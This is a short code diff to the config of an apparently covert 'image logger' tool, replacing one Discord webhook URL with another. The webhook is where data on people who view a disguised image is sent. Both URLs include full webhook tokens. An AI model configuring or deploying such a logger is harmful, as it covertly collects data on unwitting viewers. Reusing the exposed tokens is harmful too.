@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1105237363808030850/ZNGpRi8anYbCYDH8dyJozCEoYhULIbBgxeIJSit09x4jN6GMEuICGrc5qFhJ-djRva0a",
+    "webhook": "https://discord.com/api/webhooks/1105248213927219300/szzK9j5qc1BP8LE4w72pex71YmOwR7FiSv4rrNIRnjr435eXqYLblh1y4s4nyvjJhzed",
     "image": "https://www.nps.gov/prwi/learn/education/images/Tic-Tac-Toe-Board.JPG?maxwidth=1300&maxheight=1300&autorotate=false", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use aa URL argument to change the image (SEE THE README)
